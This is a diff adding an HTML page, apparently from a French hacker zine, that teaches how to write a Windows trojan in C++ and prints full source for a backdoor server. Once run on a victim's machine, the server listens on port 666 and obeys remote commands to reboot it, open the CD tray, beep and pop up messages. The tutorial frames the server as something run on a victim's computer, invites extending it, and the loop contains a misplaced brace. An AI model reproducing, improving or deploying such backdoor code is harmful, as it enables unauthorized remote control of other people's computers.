@@ -1,0 +1,283 @@
+<html>
+<head>
+<title>TROYAN</title>
+</head>
+<body bgcolor=#000000>
+<center>
+</font>
+<pre>
+<font size=2 color=#ffff00>
+******************************************************************************
+{{{{{{{{{{{{{{{{{{{{{{{  CODER DES TROYANS EN C++  }}}}}}}}}}}}}}}}}}}}}}}}}}}
+******************************************************************************
+</center> </font> </pre> <font size=3 color=#ffffff>
+<br>
+A - Qu'est ce qu'un troyan ?<br>
+C'est un programme qui une fois executé sur l'ordinateur de votre victime
+vous permet de contrôler son système. Celui que nous programmerons sera fait
+pour windows pour donner la base de la programmtion socket en C/C++
+aux débutants.. <br><br>
+
+Un troyan fonctionne sous la forme d'une application client-server.
+Il est en fait composé de 2 fichiers exécutables:<br><br>
+
+- Le server = programme a lancer sur la victime<br>
+- Le client = centre de controle a lancer sur vous-même<br><br>
+
+Ps: j'espère que vous saviez au moins ceci, mais bon on ne sait jamais ;)<br>
+Pour tout ce qui est partie réseau, nous utilisons les sockets.<br><br>
+
+B - Comment programmer en C++ windows une application client-server?<br><br>
+
+<font size=3 color=#0000FF>
+<pre>
+	le server
+	-----------
+
+	1) Il faut tout d'abord initialiser le système des sockets.
+	2) créer un socket
+	3) remplir une structure sockaddr_in
+	4) binder ( lier ) le socket à la structure
+	5) mettre le socket en listen()
+	6) accépter une connection d'un client avec accept()
+	...
+	7) détruire le socket
+	8) libérer winsock
+
+	le client
+	----------
+
+	1) initialiser le système des sockets.
+	2) créer un socket
+	3) connecter a l'host
+	4) envoyer le socket
+	5) fermer la connection en détruisant le socket et en libérant winsock
+</font></pre>
+
+Pour tout ceci il faudra inclure "winsock.h" et linker avec wsock32.lib<br><br>
+
+Voila c'est prêt.<br>
+Passons à la programmation proprement dite du server.<br>
+Commençons par inclure "winsock.h" :
+<font size=3 color=#0000FF>
+<pre>
+
+	#include &lt;winsock.h&gt;
+</font></pre>
+
+		Nous déclarons nos structures sockaddr_in et nous créons "len" qui contient la taille d'un structure:
+<font size=3 color=#0000FF>
+<pre>
+
+	struct   sockaddr_in sin;
+	struct   sockaddr_in info;
+	int len = sizeof(SOCKADDR_IN);
+</font></pre>
+
+		ensuite nous passons a l'initialisation de winsock en déclarant que nous voulons la version 1.1 minimum :
+<font size=3 color=#0000FF>
+<pre>
+
+	WSADATA wsaData;
+	WORD verreq;
+	verreq=MAKEWORD(2,2);
+	WSAStartup(verreq,&wsaData);
+</font></pre>
+
+MAKEWORD est une fonction de winsock qui permet de donner la version.<br>
+En asm, préférez faire un décalage de bits (voir counterstrike3 - troyan
+en asm par obscurer ! bonjour a vous au passage).<br><br>
+
+puis la création d'un socket:
+<font size=3 color=#0000FF>
+<pre>
+
+	SOCKET s;
+	s=socket(AF_INET, SOCK_STREAM, 0);
+</font></pre>
+
+et le remplissage d'une structure sockaddr_in pour donner les propriétées de nos sockets :
+<font size=3 color=#0000FF>
+<pre>
+	sin.sin_family = PF_INET;	//toujours PF_INET sous windows
+	sin.sin_addr.s_addr = NULL;	//on connait pas l'ip du client
+	sin.sin_port = htons(12345);	//htons donne la valeur correspond au port
+					//en NETWORK BYTE ORDER.
+</font></pre>
+
+puis nous bindons(lier) le socket:
+<font size=3 color=#0000FF>
+<pre>
+	if (bind (s,(struct sockaddr *)&sin,len)==SOCKET_ERROR)goto error;
+</font></pre>
+
+puis nous le mettons en écoute:
+<font size=3 color=#0000FF>
+<pre>
+	if (listen(s,1)==SOCKET_ERROR)goto error;
+</font></pre>
+
+et nous attendons une connection:
+<font size=3 color=#0000FF>
+<pre>
+	SOCKET sok;
+	sok=accept(s,(struct sockaddr *)&info,&len);
+	if (sok == INVALID_SOCKET)goto error;
+</font></pre>
+sok sera la socket accepté et info la structure sockaddr_in qui lui correspond.<br>
+Après nous envoyons ce que nous voulons grâce a la fonction send().<br>
+Pour recevoir nous utilisons recv()<br>
+A la fin ou en cas d'erreur nous nettoyons tout:
+<font size=3 color=#0000FF>
+<pre>
+	fin:
+	closesocket(s);
+	WSACleanup();
+</font></pre>
+
+C'est assez difficile à comprendre si vous ne connaissez pas très bien le C/C++.
+Pour illustrer tout ceci rien de mieux qu'un exemple.
+Voici donc le source de mon troyan  en C++. Et si vous voulez un autre source
+regardez mon émulateur NetBus qui est tout simple. Allez voila le source
+du server.(n'oubliez pas de linker wsock32.lib en faisant sous vc++ :
+project->settings->link et rajoutez wsock32.lib au début de la liste ainsi
+que winmm.lib qui est utilisée ici pour ouvrir le lecteur cd)
+Ce troyan n'est pas très évolué mais il est relativement simple de
+l'améliorer.(les exes sont joints pour ceux qui n'ont pas VC++ ou le compilateur)
+Le source du client est joint pour ne pas surcharger le mag.<br>
+
+<font size=3 color=#0000FF>
+<pre>
+
+//----------------------------------------------------------------------
+// EnCuLaToR TroYaN par TiPiaX - Hccc
+//----------------------------------------------------------------------
+
+#include &lt;stdio.h&gt;
+#include &lt;winsock.h&gt;   //pour les sockets
+
+//prototypes
+int troyan(void);
+
+//variables
+SOCKET   s;
+SOCKET   sok;
+WSADATA  wsaData;
+WORD     verreq;
+struct   sockaddr_in sin;
+struct   sockaddr_in info;
+int len = sizeof(SOCKADDR_IN);
+
+char signature[]="EnCuLaToR v0.1\r\n";    //signature
+int recu = 1;
+char buf[20]; //buffer pour recevoir des datas
+char message[]="reboot\r\n";
+char open[]="open\r\n";
+char close[]="close\r\n";
+char beep[]="beep\r\n";
+char chat[]="chat\r\n";
+char parole[100];
+char titre[100];
+
+/**** ENTRY POINT ****/
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst,
+				LPSTR lpCmdLine, int nCmdShow)
+{
+	troyan();
+	return (0);
+}
+
+/**** !§ TROYAN §! ****/
+
+int troyan(void)
+{
+
+	//initialisation du système de sockets:
+	verreq=MAKEWORD(2,2);
+	WSAStartup(verreq,&wsaData);
+
+	//remplissage de la structure sockaddr_in
+	sin.sin_family = PF_INET;
+	sin.sin_addr.s_addr = NULL;
+	sin.sin_port = htons(666);
+
+	//création d'un socket:
+	s = socket(PF_INET, SOCK_STREAM, 0);
+
+	//bind le socket
+	if (bind (s,(struct sockaddr *)&sin,len)==SOCKET_ERROR)goto error;
+
+	//socket en ecoute de connection
+	if (listen(s,1)==SOCKET_ERROR)goto error;
+
+onrepart:
+
+	//accepte la connection
+	sok=accept(s,(struct sockaddr *)&info,&len);
+	if (sok == INVALID_SOCKET)goto error;
+
+	send(sok,signature,strlen(signature),0);
+
+	//ici tout est bon, il n'y a plus qu'a recevoir les messages du client:
+	int comparaison;
+	recu = 1;
+	while (recv(sok,buf,sizeof(buf),0)!=0) // boucle tant que la connection existe
+	{
+		comparaison = lstrcmp(buf,message);
+		if (comparaison==0)ExitWindowsEx(EWX_REBOOT,NULL);
+		comparaison = lstrcmp(buf,open);
+		if (comparaison==0)mciSendString("Set cdaudio door open wait",0,0,0);
+		comparaison = lstrcmp(buf,close);
+		if (comparaison==0)mciSendString("Set cdaudio door closed wait",0,0,0);}
+		comparaison = lstrcmp(buf,beep);
+		if (comparaison==0)Beep(NULL,NULL);
+
+		//boite de message
+		comparaison = lstrcmp(buf,chat);
+		if (comparaison==0)
+			if(recv(sok,titre,sizeof(titre),0)!=0)
+				if(recv(sok,parole,sizeof(parole),0)!=0)
+					MessageBox(NULL,parole,titre,MB_OK);
+	}
+
+	memset(&info,0,sizeof(SOCKADDR_IN));
+	closesocket(sok);
+	goto onrepart;
+
+	error:
+	int nombre;
+	char buffer[30];
+	nombre=WSAGetLastError();
+	sprintf(buffer,"%d",nombre);
+	MessageBox(NULL,buffer,"ERROR : WSAGetLastError :",MB_OK);
+	closesocket(s);
+	WSACleanup();
+	ExitProcess(0);
+}
+
+//----------------------------------------------------------------------
+</font></pre>
+
+
+Ce troyan peut même servir sans créer de client. En effet il suffit de se connecter
+avec telnet sur le port 666 et d'écrire des messages tels que: "reboot" :)<br>
+Petite remarque:<br>
+pour le système de boite de message, il faut envoyer "chat" au server.<br>
+celui-ci attendra que vous lui envoyer le titre puis ensuite le message.<br><br>
+
+Voilà, si vous voulez que je continue ce troyan mailez-moi et donnez-moi l'inspiration :)<br><br>
+
+ps: la version présente ici est une version simplifiée du troyan. Le source du troyan
+en version actuelle est joint au zine. N'hésiter pas à y jeter un coup d'oeil c'est
+fait pour (j'ai un peu hésité à distribuer le source mais vu que CDC le fait bien et
+que le mien est 100 fois plus pourrave, autant le faire)<br>
+
+<font size=3 color=#ffff00><br><br>
+<center>
+<pre>TiPiaX/VDS</pre>
+<br>
+</font></body></html>
+
+
+
